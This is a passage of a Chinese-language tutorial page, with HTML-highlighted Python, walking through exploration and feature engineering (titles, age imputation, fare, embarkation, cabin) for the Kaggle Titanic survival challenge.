class="string">&#x27;Age&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>], </span><br><span class="line">           c=<span class="string">&#x27;red&#x27;</span>, s=data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/5.png" alt="png"></p><p>圆圈的大小与票价成正比。</p><p>在 x 轴上，我们有年龄，在 y 轴，我们考虑票价。</p><p>我们可以观察不同的集群：</p><ol><li>x = 20 和 x = 45 之间的大绿点：票价最高的成人</li><li>x = 10 和 x = 45 之间的小红点，船上较低级别的成年人</li><li>x = 0 和 x = 7 之间的小密集点：这些是被保存的孩子</li></ol><p>事实上，票价与我们在下面的图表中看到的类别相关。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ax = plt.subplot()</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Average fare&#x27;</span>)</span><br><span class="line">data.groupby(<span class="string">&#x27;Pclass&#x27;</span>).mean()[<span class="string">&#x27;Fare&#x27;</span>].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>), ax = ax);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/6.png" alt="png"></p><p>现在让我们看看登船地点如何影响生存。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Embarked&#x27;</span>, y=<span class="string">&#x27;Fare&#x27;</span>, hue=<span class="string">&#x27;Survived&#x27;</span>, data=data, split=<span class="literal">True</span>, palette=&#123;<span class="number">0</span>: <span class="string">&quot;r&quot;</span>, <span class="number">1</span>: <span class="string">&quot;g&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/7.png" alt="png"></p><p>似乎登船地点 C 的票价范围更广，因此支付最高价格的乘客是那些幸存的乘客。</p><p>我们也看到这种情况发生在登船地点 S 而不是登船地点 Q。</p><p>现在让我们停止数据探索并切换到下一部分。</p><h2><span id="ii-te-zheng-gong-cheng">II - 特征工程</span></h2><p>在前一部分中，我们调查了数据并发现了一些有趣的相关性。</p><p>在这一部分中，我们将看到如何处理和转换这些变量，使数据变得可以通过机器学习算法进行管理。</p><p>我们还将创建或“设计”在构建模型时有用的其他功能。</p><p>我们将在此过程中看到如何处理文本变量（如乘客姓名）并将此信息集成到我们的模型中。</p><p>为了更加清晰，我们将代码分散在单独的函数中。</p><p>但首先，让我们定义一个打印函数，断言是否已经处理了一个特征。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">status</span>(<span class="params">feature</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Processing&#x27;</span>, feature, <span class="string">&#x27;: ok&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="jia-zai-shu-ju">加载数据</span></h3><p>启动机器学习问题的一个技巧是将训练集一起附加到测试集。</p><p>我们将使用训练集进行特征工程以防止信息泄漏。然后我们将这些变量添加到测试集中。</p><p>让我们加载训练集和测试集并将它们合在一起。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_combined_data</span>():</span><br><span class="line">    <span class="comment"># reading train data</span></span><br><span class="line">    train = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reading test data</span></span><br><span class="line">    test = pd.read_csv(<span class="string">&#x27;./data/test.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># extracting and then removing the targets from the training data </span></span><br><span class="line">    targets = train.Survived</span><br><span class="line">    train.drop([<span class="string">&#x27;Survived&#x27;</span>], <span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># merging train data and test data for future feature engineering</span></span><br><span class="line">    <span class="comment"># we&#x27;ll also remove the PassengerID since this is not an informative feature</span></span><br><span class="line">    combined = train.append(test)</span><br><span class="line">    combined.reset_index(inplace=<span class="literal">True</span>)</span><br><span class="line">    combined.drop([<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;PassengerId&#x27;</span>], inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = get_combined_data()</span><br></pre></td></tr></table></figure><p>让我们看一下数据的维度。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.shape</span><br></pre></td></tr></table></figure><pre><code>(1309, 10)</code></pre><p>训练集和测试集被合并。您可能会注意到总行数（1309）是训练集和测试集中行数的精确总和。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>    </tr>  </tbody></table><h3><span id="ti-qu-cheng-ke-cheng-wei">提取乘客称谓</span></h3><p>在查看乘客姓名时，人们可能想知道如何处理它们以提取有用的信息。</p><p>如果你仔细看看这些第一个例子：</p><ul><li>Braund, <strong>Mr.</strong> Owen Harris</li><li>Heikkinen, <strong>Miss.</strong> Laina</li><li>Oliva y Ocana, <strong>Dona.</strong> Fermina</li><li>Peter, <strong>Master.</strong> Michael J</li></ul><p>你会注意到每个名字都有一个称谓！这可能是一个简单的小姐（Miss.）或太太（Mrs.），但它有时可能像 Master，Sir 或 Dona 那样更复杂。在这种情况下，我们可以通过简单地解析称谓并提取标题并转换为二进制变量来引入有关社会地位的其他信息。</p><p>让我们看看我们将如何在下面的函数中执行此操作。</p><p>让我们先来看看在训练集中有什么不同的称谓。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">titles = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> data[<span class="string">&#x27;Name&#x27;</span>]:</span><br><span class="line">    titles.add(name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].strip())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> titles</span><br></pre></td></tr></table></figure><pre><code>set(['Sir', 'Major', 'the Countess', 'Don', 'Mlle', 'Capt', 'Dr', 'Lady', 'Rev', 'Mrs', 'Jonkheer', 'Master', 'Ms', 'Mr', 'Mme', 'Miss', 'Col'])</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Title_Dictionary = &#123;</span><br><span class="line">    <span class="string">&quot;Capt&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Col&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Major&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Jonkheer&quot;</span>: <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Don&quot;</span>: <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sir&quot;</span> : <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Dr&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Rev&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;the Countess&quot;</span>:<span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mme&quot;</span>: <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mlle&quot;</span>: <span class="string">&quot;Miss&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ms&quot;</span>: <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mr&quot;</span> : <span class="string">&quot;Mr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mrs&quot;</span> : <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Miss&quot;</span> : <span class="string">&quot;Miss&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Master&quot;</span> : <span class="string">&quot;Master&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Lady&quot;</span> : <span class="string">&quot;Royalty&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_titles</span>():</span><br><span class="line">    <span class="comment"># we extract the title from each name</span></span><br><span class="line">    combined[<span class="string">&#x27;Title&#x27;</span>] = combined[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> name:name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a map of more aggregated title</span></span><br><span class="line">    <span class="comment"># we map each title</span></span><br><span class="line">    combined[<span class="string">&#x27;Title&#x27;</span>] = combined.Title.<span class="built_in">map</span>(Title_Dictionary)</span><br><span class="line">    status(<span class="string">&#x27;Title&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数解析名称并提取称谓。 然后，它将称谓映射到称谓类别。我们选择：</p><ul><li>Officer</li><li>Royalty</li><li>Mr</li><li>Mrs</li><li>Miss</li><li>Master</li></ul><p>让我们运行一下！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = get_titles()</span><br></pre></td></tr></table></figure><pre><code>Processing Title : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>      <td>Mr</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>      <td>Mrs</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>      <td>Miss</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>      <td>Mrs</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>      <td>Mr</td>    </tr>  </tbody></table><p>让我们检查一下称谓是否填写正确。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined[combined[<span class="string">&#x27;Title&#x27;</span>].isnull()]</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title</th>    </tr>  </thead>  <tbody>    <tr>      <th>1305</th>      <td>1</td>      <td>Oliva y Ocana, Dona. Fermina</td>      <td>female</td>      <td>39.0</td>      <td>0</td>      <td>0</td>      <td>PC 17758</td>      <td>108.9</td>      <td>C105</td>      <td>C</td>      <td>NaN</td>    </tr>  </tbody></table><p>在1305行中确实存在 NaN 值。实际上相应的名称是 <code>Oliva y Ocana, **Dona**. Fermina</code>。</p><p>在训练数据集中没有遇到这个标题。</p><p>很好，现在我们有一个名为 <strong>Title</strong> 的附加列来包含这些信息。</p><h3><span id="chu-li-nian-ling-age">处理年龄（Age）</span></h3><p>我们在第一部分中看到 <code>Age</code> 变量缺少177个值。这是一个很大的数字（约占数据集的13％）。简单地用平均年龄或中位年龄替换它们可能不是最佳解决方案，因为年龄可能因乘客的类别和类别而不同。</p><p>为了理解原因，让我们按性别（Sex），称谓（Title）和乘客类（Pclass）对我们的数据集进行分组，并为每个子集计算中位数年龄。</p><p>为了避免测试集中的数据泄漏，我们使用训练集填写训练中的缺失年龄，并且我们使用从训练集计算的值来填充测试集中的年龄。</p><p>训练级中缺少的年龄数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.iloc[:<span class="number">891</span>].Age.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure><pre><code>177</code></pre><p>测试集中缺少的年龄数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.iloc[<span class="number">891</span>:].Age.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure><pre><code>86</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grouped_train = combined.iloc[:<span class="number">891</span>].groupby([<span class="string">&#x27;Sex&#x27;</span>,<span class="string">&#x27;Pclass&#x27;</span>,<span class="string">&#x27;Title&#x27;</span>])</span><br><span class="line">grouped_median_train = grouped_train.median()</span><br><span class="line">grouped_median_train = grouped_median_train.reset_index()[[<span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Pclass&#x27;</span>, <span class="string">&#x27;Title&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grouped_median_train.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Sex</th>      <th>Pclass</th>      <th>Title</th>      <th>Age</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>female</td>      <td>1</td>      <td>Miss</td>      <td>30.0</td>    </tr>    <tr>      <th>1</th>      <td>female</td>      <td>1</td>      <td>Mrs</td>      <td>40.0</td>    </tr>    <tr>      <th>2</th>      <td>female</td>      <td>1</td>      <td>Officer</td>      <td>49.0</td>    </tr>    <tr>      <th>3</th>      <td>female</td>      <td>1</td>      <td>Royalty</td>      <td>40.5</td>    </tr>    <tr>      <th>4</th>      <td>female</td>      <td>2</td>      <td>Miss</td>      <td>24.0</td>    </tr>  </tbody></table><p>此 dataframe 将帮助我们根据不同的标准估算缺失的年龄值。</p><p>查看中位年龄列，看看这个值如何根据 <code>Sex</code>，<code>Pclass</code> 和 <code>Title</code> 组合在一起。</p><p>例如：</p><ul><li>如果乘客是女性，则来自 Pclass 1 和来自王室（royalty），中位年龄为40.5岁。</li><li>如果乘客是男性，来自 Pclass 3，拥有 Mr 称谓，则年龄中位数为26岁。</li></ul><p>让我们创建一个函数，根据这些不同的属性填充 <strong>组合</strong> 中的缺失年龄。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fill_age</span>(<span class="params">row</span>):</span><br><span class="line">    condition = (</span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Sex&#x27;</span>] == row[<span class="string">&#x27;Sex&#x27;</span>]) &amp; </span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Title&#x27;</span>] == row[<span class="string">&#x27;Title&#x27;</span>]) &amp; </span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Pclass&#x27;</span>] == row[<span class="string">&#x27;Pclass&#x27;</span>])</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> grouped_median_train[condition][<span class="string">&#x27;Age&#x27;</span>].values[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_age</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># a function that fills the missing values of the Age variable</span></span><br><span class="line">    combined[<span class="string">&#x27;Age&#x27;</span>] = combined.apply(<span class="keyword">lambda</span> row: fill_age(row) <span class="keyword">if</span> np.isnan(row[<span class="string">&#x27;Age&#x27;</span>]) <span class="keyword">else</span> row[<span class="string">&#x27;Age&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line">    status(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_age()</span><br></pre></td></tr></table></figure><pre><code>Processing age : ok</code></pre><p>完美。失踪的年龄已被取代。</p><p>但是，我们注意到票价（Fare）中缺少1个值，登船位置（Embarked）有两个缺失值，而船舱位置（Cabin）有很多缺失值。我们稍后会处理这些变量。</p><p>我们现在处理名字。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_names</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># we clean the Name variable</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Name&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encoding in dummy variable</span></span><br><span class="line">    titles_dummies = pd.get_dummies(combined[<span class="string">&#x27;Title&#x27;</span>], prefix=<span class="string">&#x27;Title&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, titles_dummies], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># removing the title variable</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Title&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;names&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数会删除 <code>Name</code> 列，我们不再使用它，因为我们创建了 <code>Title</code> 列。</p><p>然后我们使用虚拟编码（dummy encoding）对称谓值进行编码。</p><p>您可以了解虚拟编码以及如何在 <a href="http://pandas.pydata.org/pandas-docs/stable/generated/pandas.get_dummies.html">Pandas</a> 中轻松完成此操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_names()</span><br></pre></td></tr></table></figure><pre><code>Processing names : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>  </tbody></table><p>如你看到的 ：</p><ul><li>不再有名字特征。</li><li>出现了新的变量（Title_X）。这些特征是二进制的。<ul><li>例如，如果 Title_Mr = 1，则相应的称谓为 Mr。</li></ul></li></ul><h3><span id="chu-li-piao-jie-fare">处理票价（Fare）</span></h3><p>让我们通过在训练集上计算的平均票价估算缺失的票价值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_fares</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># there&#x27;s one missing fare value - replacing it with the mean.</span></span><br><span class="line">    combined.Fare.fillna(combined.iloc[:<span class="number">891</span>].Fare.mean(), inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;fare&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数用平均值替换一个缺失的票价（Fare）值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_fares()</span><br></pre></td></tr></table></figure><pre><code>Processing fare : ok</code></pre><h3><span id="chu-li-deng-chuan-wei-zhi-embarked">处理登船位置（Embarked）</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_embarked</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># two missing embarked values - filling them with the most frequent one in the train  set(S)</span></span><br><span class="line">    combined.Embarked.fillna(<span class="string">&#x27;S&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># dummy encoding</span></span><br><span class="line">    embarked_dummies = pd.get_dummies(combined[<span class="string">&#x27;Embarked&#x27;</span>], prefix=<span class="string">&#x27;Embarked&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, embarked_dummies], axis=<span class="number">1</span>)</span><br><span class="line">    combined.drop(<span class="string">&#x27;Embarked&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;embarked&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数用最常用的 <code>Embarked</code> 值替换了两个缺失的 <code>Embarked</code> 值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_embarked()</span><br></pre></td></tr></table></figure><pre><code>Processing embarked : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>  </tbody></table><h3><span id="chu-li-chuan-cang-wei-zhi-cabin">处理船舱位置（Cabin）</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_cabin, test_cabin = <span class="built_in">set</span>(), <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> combined.iloc[:<span class="number">891</span>][<span class="string">&#x27;Cabin&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        train_cabin.add(c[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        train_cabin.add(<span class="string">&#x27;U&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> combined.iloc[<span class="number">891</span>:][<span class="string">&#x27;Cabin&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_cabin.add(c[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        test_cabin.add(<span class="string">&#x27;U&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> train_cabin</span><br></pre></td></tr></table></figure><pre><code>set(['A', 'C', 'B', 'E', 'D', 'G', 'F', 'U', 'T'])</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> test_cabin</span><br></pre></td></tr></table></figure><pre><code>set(['A', 'C', 'B', 'E', 'D', 'G', 'F', 'U'])</code></pre><p>我们在测试集中没有任何不存在于训练集中的船舱位置字母。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_cabin</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># replacing missing cabins with U (for Uknown)</span></span><br><span class="line">    combined.Cabin.fillna(<span class="string">&#x27;U&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># mapping each Cabin value with the cabin letter</span></span><br><span class="line">    combined[<span class="string">&#x27;Cabin&#x27;</span>] = combined[<span class="string">&#x27;Cabin&#x27;</span>].<span 